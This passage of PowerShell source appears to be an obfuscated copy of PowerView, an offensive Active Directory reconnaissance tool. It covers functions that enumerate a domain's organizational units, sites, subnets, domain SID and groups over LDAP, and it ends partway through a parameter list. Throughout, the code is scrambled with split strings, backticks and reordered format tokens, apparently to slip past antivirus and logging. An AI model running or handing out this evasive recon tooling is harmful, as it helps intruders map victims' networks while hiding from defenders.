                ${fi`L`TeR} += "(|$IdentityFilter)"
            }

            if (${PsboUnDPa`RAM`e`TerS}[("{1}{2}{0}"-f'ink','G','PL')]) {
                &("{0}{3}{4}{1}{2}"-f'W','Verbo','se','r','ite-') ('['+'Get-Doma'+'inOU'+']'+' '+'Search'+'in'+'g'+' '+'fo'+'r '+'OU'+'s '+'with'+' '+"$GPLink "+'s'+'et '+'i'+'n '+'th'+'e '+'gp'+'Li'+'nk '+'propert'+'y')
                ${fi`L`TEr} += "(gplink=*$GPLink*)"
            }

            if (${pSBO`UNdPa`R`AmetE`RS}[("{1}{2}{0}" -f 'Filter','L','DAP')]) {
                &("{0}{2}{1}{3}" -f 'Writ','erbo','e-V','se') ('['+'Get-Domai'+'n'+'OU'+'] '+'Us'+'in'+'g '+'addit'+'ion'+'a'+'l '+'LD'+'AP '+'filte'+'r:'+' '+"$LDAPFilter")
                ${fI`LTEr} += "$LDAPFilter"
            }

            ${o`U`s`eArcher}."Fil`TER" = "(&(objectCategory=organizationalUnit)$Filter)"
            &("{1}{4}{3}{0}{2}"-f'bo','Wr','se','Ver','ite-') "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter) "

            if (${pSBOUN`dpaRaME`T`ErS}[("{2}{0}{1}"-f'ndO','ne','Fi')]) { ${re`sU`lTs} = ${OusE`AR`cheR}.("{0}{1}{2}" -f'F','indO','ne').Invoke() }
            else { ${Re`S`UltS} = ${oUse`A`R`CHer}.("{0}{1}" -f'Fin','dAll').Invoke() }
            ${R`eSults} | &("{1}{3}{2}{0}"-f 'ect','W','re-Obj','he') {${_}} | &("{2}{3}{4}{1}{0}" -f't','jec','F','orEach-','Ob') {
                if (${pS`BouNdPaRaMe`TE`RS}['Raw']) {
                    
                    ${o`U} = ${_}
                }
                else {
                    ${o`U} = &("{2}{0}{1}{4}{6}{5}{3}"-f'onvert','-LDA','C','y','P','ert','Prop') -Properties ${_}."PR`OP`erties"
                }
                ${oU}."pSo`BjeCt"."tyPE`NaM`es".("{1}{0}"-f 'rt','Inse').Invoke(0, ("{0}{2}{1}"-f'Power','OU','View.'))
                ${O`U}
            }
            if (${r`ES`Ults}) {
                try { ${reS`Ul`TS}.("{1}{0}"-f 'spose','di').Invoke() }
                catch {
                    &("{4}{3}{1}{0}{2}"-f '-','te','Verbose','ri','W') ('[Get'+'-DomainO'+'U] '+'E'+'rror'+' '+'dis'+'posing'+' '+'of'+' '+'t'+'he '+'R'+'esults '+'objec'+'t:'+' '+"$_")
                }
            }
            ${oUSE`ArC`HEr}.("{2}{0}{1}" -f'p','ose','dis').Invoke()
        }
    }
}


function Get`-do`M`AiNs`itE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{4}{0}"-f's','roce','PSShould','P','s'}, '')]
    [OutputType({"{0}{1}{2}" -f 'Powe','rVi','ew.Site'})]
    [CmdletBinding()]
    Param (
        [Parameter(POSitIOn = 0, VALUefrOmpiPelINE = ${Tr`UE}, ValUeFrOmpIpElINEBYPROPeRtynAME = ${tr`Ue})]
        [Alias({"{1}{0}" -f'me','Na'})]
        [String[]]
        ${ID`enTITy},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}"-f 'UID','G'})]
        ${g`pL`InK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oMA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Filt','er'})]
        [String]
        ${L`DapF`iL`Ter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PrO`PEr`TIES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'A','DSPa','th'})]
        [String]
        ${se`ARC`HbASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{4}{0}"-f 'ler','Co','Domain','ntr','ol'})]
        [String]
        ${Se`Rv`er},

        [ValidateSet({"{0}{1}"-f 'Bas','e'}, {"{1}{0}{2}"-f 'Lev','One','el'}, {"{1}{0}"-f 'e','Subtre'})]
        [String]
        ${Sear`ch`sCO`pe} = ("{1}{0}{2}" -f 'ub','S','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`SultPAg`esI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seR`Ver`TImEli`MIT},

        [ValidateSet({"{1}{0}" -f'cl','Da'}, {"{0}{1}"-f 'Gr','oup'}, {"{0}{1}" -f 'No','ne'}, {"{1}{0}" -f 'ner','Ow'}, {"{0}{1}"-f'S','acl'})]
        [String]
        ${SEC`Ur`it`ymasKS},

        [Switch]
        ${tom`BstO`Ne},

        [Alias({"{0}{1}{2}"-f 'Re','turnO','ne'})]
        [Switch]
        ${F`I`NDone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReDEn`Ti`Al} =  (&("{0}{1}{2}" -f'vArIA','Bl','e') ("{0}{1}" -f'J','h3xo6') )."Va`Lue"::"e`mPty",

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${se`ARC`HERa`RGU`mEnts} = @{
            ("{3}{1}{0}{4}{2}" -f'seP','archBa','x','Se','refi') = ("{2}{4}{3}{0}{1}{5}"-f'igura','t','CN=Site','=Conf','s,CN','ion')
        }
        if (${PSbO`UN`DPar`Am`ete`RS}[("{1}{0}{2}"-f 'm','Do','ain')]) { ${s`eA`RCHERarg`Um`E`NtS}[("{1}{0}"-f 'in','Doma')] = ${d`om`AiN} }
        if (${Psb`Ou`ND`pARAm`etERs}[("{0}{2}{1}"-f'Prop','s','ertie')]) { ${Se`Ar`Ch`ER`ARGumEN`Ts}[("{1}{2}{0}"-f'ties','Prope','r')] = ${prO`p`ERTIes} }
        if (${pSB`Ou`Nd`PAram`eTERS}[("{0}{1}{2}" -f'Sea','r','chBase')]) { ${sea`RChE`RAr`gumENts}[("{1}{3}{0}{2}"-f'B','Searc','ase','h')] = ${Se`AR`cHba`se} }
        if (${Psb`OuND`paRaMe`Te`RS}[("{2}{0}{1}" -f'r','ver','Se')]) { ${s`E`Arc`He`RA`RGUMEnts}[("{0}{2}{1}" -f 'Se','er','rv')] = ${ser`V`er} }
        if (${P`S`BoUndpa`RAm`ET`Ers}[("{1}{0}{3}{2}" -f 'earch','S','pe','Sco')]) { ${SEarcH`ERA`RgUmE`NTs}[("{2}{0}{1}" -f 'rch','Scope','Sea')] = ${Se`ArCHSc`oPe} }
        if (${PSBOun`DP`Ara`MEterS}[("{2}{3}{0}{1}" -f 'sultPageSi','ze','R','e')]) { ${sE`A`RCHeRAR`gUmE`NTS}[("{3}{4}{2}{0}{1}"-f 'PageSiz','e','t','Resu','l')] = ${rE`SULtpaGE`SizE} }
        if (${psBo`UNd`pAR`AmeTers}[("{3}{2}{1}{0}{4}" -f 'i','imeL','rverT','Se','mit')]) { ${SE`ARch`e`R`ARgUm`enTs}[("{2}{1}{0}{3}" -f 'im','rT','Serve','eLimit')] = ${S`ER`VErT`i`meLi`mIt} }
        if (${pSbo`UNdpA`RAmEt`erS}[("{1}{3}{0}{2}"-f'y','Secur','Masks','it')]) { ${s`EArChe`RA`R`Gume`Nts}[("{4}{0}{2}{3}{1}" -f'ty','sks','M','a','Securi')] = ${s`ecuRI`TYmasKS} }
        if (${pSBOuNDPAr`A`me`TerS}[("{0}{1}{2}" -f 'Tom','b','stone')]) { ${s`EArcHe`RARGUme`NTs}[("{1}{2}{0}"-f'e','Tom','bston')] = ${TOM`BStO`NE} }
        if (${PSBO`UNd`p`A`Ra`mETErS}[("{0}{1}{2}"-f 'Credenti','a','l')]) { ${sEArCheRAR`g`UMen`Ts}[("{2}{1}{0}"-f'edential','r','C')] = ${c`Re`DEnTIAL} }
        ${s`iT`esEa`RCHer} = &("{2}{0}{3}{1}" -f 't-','rcher','Ge','DomainSea') @SearcherArguments
    }

    PROCESS {
        if (${sI`T`ESEa`RC`hEr}) {
            ${IdE`NTi`Ty`FiLTeR} = ''
            ${FI`L`TeR} = ''
            ${idEN`TI`Ty} | &("{2}{1}{0}" -f'ject','e-Ob','Wher') {${_}} | &("{0}{2}{1}{3}{4}"-f'ForEac','bje','h-O','c','t') {
                ${I`DeN`TiTy`INSTA`NCE} = ${_}.("{1}{0}{2}" -f'e','R','place').Invoke('(', '\28').("{1}{0}"-f'ce','Repla').Invoke(')', '\29')
                if (${IDe`N`T`i`TyinstAN`cE} -match ("{0}{1}{2}"-f'^C','N=.','*')) {
                    ${iDe`NtIT`yFilt`ER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psboUndP`A`R`AmeT`ers}[("{0}{1}" -f 'Doma','in')]) -and (-not ${PS`BOunDPaR`A`M`ET`ErS}[("{0}{2}{3}{1}"-f 'Sear','e','ch','Bas')])) {
                        
                        
                        ${IdeN`Ti`Ty`doma`In} = ${IdeNtit`Y`INSTAN`cE}.("{0}{1}{2}" -f 'SubSt','rin','g').Invoke(${iDE`NTityins`TaN`CE}.("{1}{0}" -f 'Of','Index').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{3}{1}{2}{0}{4}" -f'rbos','r','ite-Ve','W','e') ('[G'+'et-Domain'+'Site'+'] '+'E'+'xtrac'+'ted '+'domain'+' '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${SE`ARCheR`ARg`UmEn`TS}[("{1}{0}" -f'main','Do')] = ${iden`T`ITYDoM`Ain}
                        ${SIT`e`sea`Rcher} = &("{5}{0}{3}{4}{1}{2}"-f 'et-','arche','r','D','omainSe','G') @SearcherArguments
                        if (-not ${s`iTES`eARcheR}) {
                            &("{3}{1}{4}{0}{2}"-f '-W','r','arning','W','ite') ('[Get'+'-D'+'om'+'ainSite] '+'U'+'na'+'ble '+'to'+' '+'re'+'trieve '+'domai'+'n'+' '+'sea'+'rc'+'h'+'er '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${GUIdb`yTeStrI`NG} = (-Join (([Guid]${i`denTiT`Yins`TaN`CE}).("{0}{1}{2}"-f'T','oByteA','rray').Invoke() | &("{0}{2}{1}"-f'F','ct','orEach-Obje') {${_}.("{2}{0}{1}"-f'in','g','ToStr').Invoke('X').("{1}{2}{0}" -f't','P','adLef').Invoke(2,'0')})) -Replace ("{0}{1}" -f '(..',')'),'\$1'
                        ${ID`EnTiTYf`IL`T`eR} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${IDEntIt`Y`F`il`Ter} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${iD`e`NT`i`TyfilTeR} -and (${iD`e`NTITyFi`LTeR}.("{1}{0}" -f 'im','Tr').Invoke() -ne '') ) {
                ${FIL`T`eR} += "(|$IdentityFilter)"
            }

            if (${pS`BoUNdP`AR`AmeTe`RS}[("{1}{0}"-f 'nk','GPLi')]) {
                &("{3}{0}{1}{2}" -f'b','os','e','Write-Ver') ('[Ge'+'t-DomainSi'+'te'+'] '+'Sear'+'c'+'hing '+'fo'+'r '+'si'+'t'+'es '+'with'+' '+"$GPLink "+'se'+'t '+'in'+' '+'t'+'he '+'gp'+'Link '+'pr'+'ope'+'rty')
                ${Fi`lTeR} += "(gplink=*$GPLink*)"
            }

            if (${PsBoUnDpA`Ram`e`TE`RS}[("{1}{0}{2}" -f 'lt','LDAPFi','er')]) {
                &("{3}{0}{2}{1}" -f'ri','rbose','te-Ve','W') ('[Get'+'-Doma'+'inSite'+'] '+'U'+'sing '+'ad'+'ditio'+'nal '+'LDAP'+' '+'fi'+'lter'+': '+"$LDAPFilter")
                ${FIl`Ter} += "$LDAPFilter"
            }

            ${Si`TEsEa`RcheR}."fI`L`TeR" = "(&(objectCategory=site)$Filter)"
            &("{1}{2}{0}" -f'Verbose','Write','-') "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter) "

            if (${psB`Oundp`Ara`Me`TE`RS}[("{1}{0}" -f 'dOne','Fin')]) { ${Res`UlTS} = ${Sit`eSEArcH`Er}.("{0}{1}"-f'Fi','ndAll').Invoke() }
            else { ${Re`suL`TS} = ${s`ITeseArc`H`Er}.("{1}{0}{2}"-f'indAl','F','l').Invoke() }
            ${r`E`sULtS} | &("{3}{2}{0}{1}" -f 'e-Objec','t','er','Wh') {${_}} | &("{1}{0}{2}" -f'h-Obje','ForEac','ct') {
                if (${pS`BouNDPAr`A`MEtE`RS}['Raw']) {
                    
                    ${SI`Te} = ${_}
                }
                else {
                    ${SI`Te} = &("{3}{1}{2}{4}{5}{0}"-f'ty','LD','APPr','Convert-','o','per') -Properties ${_}."pro`P`eRtiEs"
                }
                ${s`itE}."pSob`Je`CT"."t`yPeNa`mEs".("{1}{0}" -f'sert','In').Invoke(0, ("{0}{2}{1}" -f'Pow','w.Site','erVie'))
                ${si`Te}
            }
            if (${resU`l`Ts}) {
                try { ${rE`s`ULTS}.("{0}{1}" -f 'dis','pose').Invoke() }
                catch {
                    &("{0}{1}{3}{2}" -f'Wri','te','rbose','-Ve') ("{11}{12}{4}{0}{2}{3}{13}{8}{10}{6}{9}{1}{5}{7}"-f'e] Error ','u','dis','posin','mainSit','lts ','e','object','o','s','f the R','[Ge','t-Do','g ')
                }
            }
            ${siTeS`earCh`er}.("{0}{1}{2}"-f 'dis','pos','e').Invoke()
        }
    }
}


function g`et-Do`MaI`NsUbNet {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}" -f'uldPr','PSSho','oces','s'}, '')]
    [OutputType({"{2}{0}{1}{4}{3}" -f'ower','V','P','bnet','iew.Su'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOsITION = 0, vAlUeFroMpiPeLIne = ${T`RUe}, vALUefRoMPIpeliNeBypROpERtYNaMe = ${tR`UE})]
        [Alias({"{1}{0}" -f 'ame','N'})]
        [String[]]
        ${i`DE`N`TITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${s`It`enaMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MaIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'er','Filt'})]
        [String]
        ${l`D`ApfIl`TEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prOPe`RT`ies},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'SP','AD','ath'})]
        [String]
        ${S`ea`RchBasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}{4}"-f'r','o','ainCont','Dom','ller'})]
        [String]
        ${Se`RVEr},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{2}{0}{1}"-f'eL','evel','On'}, {"{1}{0}{2}"-f 'u','S','btree'})]
        [String]
        ${SEaRc`h`SC`oPE} = ("{0}{1}"-f 'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`SULT`pa`geSiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`e`RvERTimeLi`mit},

        [ValidateSet({"{1}{0}" -f 'l','Dac'}, {"{0}{1}"-f 'G','roup'}, {"{0}{1}"-f'No','ne'}, {"{0}{1}" -f'Owne','r'}, {"{1}{0}"-f'l','Sac'})]
        [String]
        ${S`e`cUR`i`TyMaskS},

        [Switch]
        ${T`ombST`o`Ne},

        [Alias({"{0}{2}{1}" -f 'Re','ne','turnO'})]
        [Switch]
        ${FI`N`Done},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`EDEnTiaL} =   (  &("{1}{0}" -f 'Tem','I') ("{1}{0}{3}{2}"-f 'ARiaB','v','6','le:jH3Xo')  )."vAL`UE"::"Em`pTy",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${sear`ChE`RArgUM`EntS} = @{
            ("{0}{3}{4}{1}{2}"-f'Se','re','fix','archBa','seP') = ("{3}{0}{2}{9}{1}{4}{8}{5}{10}{7}{6}"-f 'N=S','nets,CN','u','C','=',',C','tion','a','Sites','b','N=Configur')
        }
        if (${psBo`UN`dPaR`AMe`Te`Rs}[("{1}{2}{0}" -f 'in','D','oma')]) { ${S`ear`Ch`ERAr`GuMENtS}[("{1}{0}"-f'main','Do')] = ${dO`M`Ain} }
        if (${pSB`O`UndP`ARa`mEteRs}[("{2}{0}{1}"-f'per','ties','Pro')]) { ${SeA`R`cHERaRgu`MEnTS}[("{1}{2}{0}" -f 'es','Prop','erti')] = ${PR`o`PeRtI`es} }
        if (${p`Sb`oUN`Dparam`et`ERS}[("{0}{2}{1}" -f 'S','Base','earch')]) { ${sE`ARc`HER`A`RgUm`entS}[("{2}{0}{1}" -f'ch','Base','Sear')] = ${seAr`c`HbASE} }
        if (${pSbo`UN`DParaMe`Te`RS}[("{1}{0}"-f'erver','S')]) { ${SeARcH`Er`Ar`gumE`NTS}[("{1}{0}{2}" -f'erv','S','er')] = ${S`ERV`ER} }
        if (${p`sb`Ou`NDP`Ar`AMeTErS}[("{3}{0}{2}{1}" -f 'ar','ope','chSc','Se')]) { ${sea`Rc`H`E`RarGUmentS}[("{3}{2}{1}{0}" -f'e','archScop','e','S')] = ${s`eA`Rc`HsCOPe} }
        if (${Ps`B`ouNDP`ARAmeters}[("{2}{4}{1}{0}{3}"-f'Pa','ult','Re','geSize','s')]) { ${sEAr`c`heRaRg`U`MEnTs}[("{4}{2}{3}{0}{1}"-f 'ltPage','Size','e','su','R')] = ${Re`s`UlTpAgEsI`ze} }
        if (${PsBouN`d`pAR`AmEters}[("{0}{3}{2}{1}{4}" -f 'Se','m','imeLi','rverT','it')]) { ${S`eArchErarguM`E`NtS}[("{3}{2}{0}{4}{1}" -f'eL','it','m','ServerTi','im')] = ${S`erv`eRti`melImiT} }
        if (${P`sBoUnDPAR`AMe`TErs}[("{0}{3}{1}{4}{2}" -f'S','rit','Masks','ecu','y')]) { ${SearCh`E`RA`RGu`MENTs}[("{1}{0}{2}" -f'yMas','Securit','ks')] = ${SeC`URiT`YMAs`kS} }
        if (${pSBO`UnD`P`A`RaMetERs}[("{2}{1}{0}"-f 'tone','mbs','To')]) { ${seARc`HEr`AR`guMEnTS}[("{2}{0}{1}" -f 'mbsto','ne','To')] = ${toMb`sT`ONe} }
        if (${pSbO`UndP`ARa`meTe`Rs}[("{0}{2}{1}" -f'C','edential','r')]) { ${SEaRch`e`Rar`G`UMeNTs}[("{0}{2}{1}" -f 'C','dential','re')] = ${Cr`E`deNT`IAl} }
        ${s`Ub`NeTSeA`RC`HeR} = &("{2}{1}{0}{4}{3}"-f'D','-','Get','archer','omainSe') @SearcherArguments
    }

    PROCESS {
        if (${Sub`NeT`SEARCHER}) {
            ${IdEN`T`ITy`FILTeR} = ''
            ${FiL`T`eR} = ''
            ${iD`EnTITY} | &("{3}{0}{2}{1}" -f 'r','t','e-Objec','Whe') {${_}} | &("{0}{3}{1}{2}" -f 'F','E','ach-Object','or') {
                ${iDEnT`itY`I`Nstan`Ce} = ${_}.("{0}{1}" -f'Rep','lace').Invoke('(', '\28').("{0}{1}"-f'Repl','ace').Invoke(')', '\29')
                if (${iDENt`itYin`sT`AncE} -match ("{2}{1}{0}" -f '=.*','N','^C')) {
                    ${idEn`T`ItYfi`lTeR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${P`SBoUndp`ArAMe`TERS}[("{1}{0}" -f 'omain','D')]) -and (-not ${PS`BOUnD`ParA`meTE`RS}[("{1}{0}{2}{3}" -f 'rch','Sea','Bas','e')])) {
                        
                        
                        ${Ide`NtiTyDO`m`Ain} = ${I`D`EN`TitYINstA`Nce}.("{0}{1}" -f'SubStr','ing').Invoke(${IdEntIt`yIn`STaN`ce}.("{0}{1}"-f 'In','dexOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{1}{2}{3}" -f 'Write-V','er','bo','se') ('[Get'+'-Dom'+'ai'+'n'+'Su'+'bnet] '+'Ext'+'rac'+'ted '+'d'+'om'+'ain '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        ${sEaRcH`ERAR`GumE`N`TS}[("{2}{1}{0}" -f'main','o','D')] = ${iDeNt`ItyD`oMA`IN}
                        ${sU`BnE`TSE`ArCh`ER} = &("{1}{2}{0}{4}{3}"-f'i','Ge','t-Doma','r','nSearche') @SearcherArguments
                        if (-not ${SuBN`etsea`Rc`HeR}) {
                            &("{3}{1}{0}{2}" -f'in','te-Warn','g','Wri') ('['+'Ge'+'t-Domain'+'Sub'+'net] '+'Unabl'+'e '+'to'+' '+'r'+'etr'+'ieve '+'d'+'omain '+'sea'+'rcher'+' '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${G`UidBY`T`eStr`INg} = (-Join (([Guid]${i`DE`NTITyinsTA`NCE}).("{2}{3}{0}{1}" -f 'r','ay','ToByt','eAr').Invoke() | &("{0}{1}{2}" -f'For','Each-Obje','ct') {${_}.("{2}{0}{1}" -f 'ri','ng','ToSt').Invoke('X').("{2}{0}{1}"-f 'e','ft','PadL').Invoke(2,'0')})) -Replace ("{0}{1}"-f'(','..)'),'\$1'
                        ${iDentITyfI`l`TEr} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${iD`en`TITYfI`LT`Er} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${I`DEN`TItyf`i`lTEr} -and (${i`deN`TItyF`iLTEr}.("{0}{1}" -f 'Tri','m').Invoke() -ne '') ) {
                ${FIl`T`er} += "(|$IdentityFilter)"
            }

            if (${ps`BoUNd`pArame`TERs}[("{2}{0}{1}"-f'APFilt','er','LD')]) {
                &("{1}{2}{3}{0}"-f 'erbose','Wri','te','-V') ('[Get-Dom'+'ai'+'nSu'+'bnet'+'] '+'U'+'sing '+'additi'+'o'+'nal '+'LD'+'AP '+'f'+'il'+'ter: '+"$LDAPFilter")
                ${F`ILTer} += "$LDAPFilter"
            }

            ${SuBNetSEAR`CH`er}."f`il`TEr" = "(&(objectCategory=subnet)$Filter)"
            &("{2}{0}{1}{4}{3}" -f 'e','-','Writ','rbose','Ve') "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter) "

            if (${pS`BoUN`dPaR`A`Meters}[("{1}{2}{0}"-f'ne','Fin','dO')]) { ${r`esULtS} = ${sU`BneTsEa`RCHer}.("{2}{0}{1}" -f 'n','dOne','Fi').Invoke() }
            else { ${ReSu`lts} = ${SU`Bn`eT`sEar`ChER}.("{1}{2}{0}" -f 'l','F','indAl').Invoke() }
            ${Re`su`lTS} | &("{1}{0}{2}" -f'ere-Objec','Wh','t') {${_}} | &("{2}{0}{3}{1}" -f 'h','ect','ForEac','-Obj') {
                if (${pSB`OuND`parAME`T`Ers}['Raw']) {
                    
                    ${suB`N`Et} = ${_}
                }
                else {
                    ${S`UB`NeT} = &("{1}{4}{0}{3}{2}"-f 'L','Con','operty','DAPPr','vert-') -Properties ${_}."P`R`OPERTiEs"
                }
                ${sU`B`Net}."PS`ObJ`ECT"."tY`pena`mEs".("{0}{1}{2}"-f'I','n','sert').Invoke(0, ("{4}{0}{3}{2}{1}"-f'rV','bnet','ew.Su','i','Powe'))

                if (${pSBOUNd`paRAMe`T`ERs}[("{0}{2}{1}" -f'Site','me','Na')]) {
                    
                    
                    if (${suB`NEt}."p`RO`PEr`TIEs" -and (${SuB`NET}."pr`oPeR`TIeS"."SIt`e`ObJEct" -like "*$SiteName*")) {
                        ${s`UbN`et}
                    }
                    elseif (${SU`BN`eT}."s`itE`oBjecT" -like "*$SiteName*") {
                        ${Su`B`Net}
                    }
                }
                else {
                    ${Su`Bn`et}
                }
            }
            if (${re`S`Ults}) {
                try { ${RES`U`LtS}.("{0}{1}{2}"-f'di','spo','se').Invoke() }
                catch {
                    &("{2}{0}{3}{1}"-f'e','ose','Write-V','rb') ('[G'+'et-Domai'+'nSu'+'b'+'net'+'] '+'Err'+'or '+'d'+'is'+'p'+'osing '+'o'+'f '+'t'+'he '+'Resu'+'lts '+'ob'+'ject: '+"$_")
                }
            }
            ${SuB`NE`TsEaRC`hER}.("{1}{0}" -f 'ispose','d').Invoke()
        }
    }
}


function geT-do`maIn`S`iD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{1}{2}"-f'P','hou','ldProcess','S','S'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MAin},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}{4}" -f'inCon','trol','ma','Do','ler'})]
        [String]
        ${sER`V`eR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`Edenti`AL} =  ${Jh`3`Xo6}::"e`mpTY"
    )

    ${SEArcHeR`ArgU`m`enTS} = @{
        ("{0}{1}{2}" -f 'L','DAPFil','ter') = ("{1}{8}{6}{2}{5}{9}{7}{4}{0}{3}"-f '3:=819','(','ol:','2)','56.1.4.80','1.2.840.','countContr','135','userAc','1')
    }
    if (${PSb`oundPARAM`E`TErs}[("{1}{0}" -f 'main','Do')]) { ${SearcHE`Ra`RgUM`En`Ts}[("{1}{0}" -f'ain','Dom')] = ${D`O`mAIn} }
    if (${P`sboUNdPA`Ra`MeTerS}[("{0}{1}" -f'Serv','er')]) { ${s`ear`c`HERa`RgUmenTs}[("{0}{1}" -f 'Ser','ver')] = ${SE`RV`eR} }
    if (${pSbounD`p`Aram`ETE`RS}[("{2}{1}{0}"-f 'l','redentia','C')]) { ${sE`ARcHer`ARGume`N`TS}[("{1}{3}{0}{2}" -f'ent','C','ial','red')] = ${cr`eDEnt`Ial} }

    ${d`cSiD} = &("{3}{2}{5}{1}{4}{0}"-f'nComputer','a','et-','G','i','Dom') @SearcherArguments -FindOne | &("{2}{0}{1}{3}"-f 'elect','-Objec','S','t') -First 1 -ExpandProperty ("{0}{2}{3}{1}"-f'obj','d','ect','si')

    if (${D`CSId}) {
        ${d`cSiD}.("{0}{2}{1}" -f 'SubStr','ng','i').Invoke(0, ${DCs`iD}.("{0}{3}{1}{2}"-f'Las','O','f','tIndex').Invoke('-'))
    }
    else {
        &("{3}{1}{2}{0}" -f'bose','-Ve','r','Write') ('['+'Get'+'-D'+'omainSID] '+'Er'+'ror '+'e'+'xtra'+'cting '+'doma'+'in'+' '+'SID'+' '+'fo'+'r '+"'$Domain'")
    }
}


function GET`-`dOm`AINgRoUP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}"-f 'ho','PSS','uldPr','ocess'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}{6}{5}{4}" -f 'PSUs','ecla','red','eD','ents','anAssignm','VarsMoreTh'}, '')]
    [OutputType({"{2}{1}{4}{3}{0}"-f 'oup','werVi','Po','w.Gr','e'})]
    [CmdletBinding(dEfAUlTpAraMETERseTnAME = {"{3}{0}{2}{1}" -f 'ele','tion','ga','AllowD'})]
    Param(
        [Parameter(pOsitioN = 0, vALuEFrompIpeLiNe = ${T`RUE}, vALueFroMpiPeliNEbYprOPERtYnAmE = ${t`RuE})]
        [Alias({"{0}{2}{3}{5}{4}{1}"-f'D','dName','istin','g','e','uish'}, {"{2}{0}{1}"-f 'count','Name','SamAc'}, {"{0}{1}" -f 'Nam','e'}, {"{3}{4}{7}{1}{6}{2}{0}{5}" -f'm','inguish','a','Me','mber','e','edN','Dist'}, {"{0}{1}{2}"-f 'M','emb','erName'})]
        [String[]]
        ${IdENt`ITy},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'se','U','rName'})]
        [String]
        ${Mem`BeR`iDen`T`ITy},

        [Switch]
        ${aDMiN`COu`Nt},

        [ValidateSet({"{1}{0}{2}"-f'oca','DomainL','l'}, {"{0}{2}{1}{3}"-f'Not','o','DomainL','cal'}, {"{1}{0}{2}"-f'b','Glo','al'}, {"{0}{3}{2}{1}"-f'Not','l','oba','Gl'}, {"{0}{1}{2}"-f 'Univ','ersa','l'}, {"{1}{2}{0}{3}"-f 'ers','Not','Univ','al'})]
        [Alias({"{0}{1}" -f'S','cope'})]
        [String]
        ${Gro`Up`SC`OPE},

        [ValidateSet({"{1}{0}{2}" -f'uri','Sec','ty'}, {"{1}{2}{0}" -f 'ion','Di','stribut'}, {"{1}{2}{3}{0}"-f'ystem','Cr','e','atedByS'}, {"{1}{3}{4}{0}{2}" -f 'Sys','Not','tem','Crea','tedBy'})]
        [String]
        ${g`R`OupprO`Pe`RtY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OmaiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Filt','er'})]
        [String]
        ${LdAP`F`I`lTeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`ROpe`RtI`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f 'Pa','th','ADS'})]
        [String]
        ${sea`R`Ch`BASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{3}{1}{2}"-f'Dom','e','r','ntroll','ainCo'})]
        [String]
        ${Se`RveR},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{1}" -f'On','eLevel'}, {"{1}{0}{2}" -f'ub','S','tree'})]
        [String]
        ${s`EaRCH`sc`OPE} = ("{0}{1}"-f'Sub','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rESU`l`TPag`Es`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRVErT`im`E`L`i`Mit},

        [ValidateSet({"{1}{0}" -f 'cl','Da'}, {"{0}{1}" -f'Gr','oup'}, {"{1}{0}"-f'e','Non'}, {"{0}{1}" -f'Own','er'}, {"{1}{0}" -f 'acl','S'})]
        [String]
        ${se`CurItY`MA`SkS},

        [Switch]
        ${to`mBs`To`Ne},

